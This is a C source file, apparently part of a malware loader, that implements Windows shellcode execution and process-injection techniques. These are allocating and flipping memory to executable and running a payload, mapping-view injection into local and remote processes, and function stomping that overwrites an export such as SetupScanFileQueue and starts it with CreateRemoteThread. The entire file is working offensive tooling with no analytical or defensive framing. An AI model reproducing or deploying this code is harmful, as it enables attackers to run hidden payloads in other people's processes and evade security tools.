#include <windows.h>
#include "../include/loader.h"

#pragma comment (lib, "OneCore.lib")


BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL		bSTATE = TRUE;
    HANDLE		hFile = NULL;
    PVOID		pMapAddress = NULL;


    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    if (pMapAddress == NULL) {
        printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    printf("[i] pMapAddress : 0x%p \n", pMapAddress);

    printf("[#] Press <Enter> To Copy The Payload ... ");
    getchar();

    printf("[i] Copying Payload To 0x%p ... ", pMapAddress);
    memcpy(pMapAddress, pPayload, sPayloadSize);
    printf("[+] DONE \n");


_EndOfFunction:
    *ppAddress = pMapAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}

BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

    BOOL		bSTATE = TRUE;
    HANDLE		hFile = NULL;
    PVOID		pMapLocalAddress = NULL,
        pMapRemoteAddress = NULL;


    hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    if (hFile == NULL) {
        printf("\t[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize);
    if (pMapLocalAddress == NULL) {
        printf("\t[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    printf("\t[+] Local Mapping Address : 0x%p \n", pMapLocalAddress);

    printf("\t[#] Press <Enter> To Write The Payload ... ");
    getchar();
    printf("\t[i] Copying Payload To 0x%p ... ", pMapLocalAddress);
    memcpy(pMapLocalAddress, pPayload, sPayloadSize);
    printf("[+] DONE \n");

    pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READ);
    if (pMapRemoteAddress == NULL) {
        printf("\t[!] MapViewOfFile2 Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("\t[+] Remote Mapping Address : 0x%p \n", pMapRemoteAddress);

_EndOfFunction:
    *ppAddress = pMapRemoteAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}

BOOL LocalFunctionStomping(PVOID pPayload, SIZE_T sPayloadSize) {
    HMODULE hModule;
    PVOID pAddress; 
    DWORD dwOldProtection;

    hModule = LoadLibraryA("setupapi.dll");
    pAddress = GetProcAddress(hModule, "SetupScanFileQueue");
    VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection);
    memcpy(pAddress, pPayload, sPayloadSize);
    VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection);
    (*(VOID(*)()) pAddress)();
}


BOOL RemoteFunctionStomping(HANDLE hProcess, PVOID pPayload, SIZE_T sPayloadSize, LPCSTR DLLName, LPCSTR FunctionName) {
    HMODULE hModule;
    PVOID pAddress;
    DWORD dwOldProtection, sNumberOfBytesWritten;

    hModule = LoadLibraryA(DLLName);
    pAddress = GetProcAddress(hModule, FunctionName);

    printf("[*] %s Loaded into: 0x%p\n", FunctionName, pAddress);
    getchar();
    
    VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection);
    WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten);
    VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection);

    getchar();
    CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
    return TRUE;
}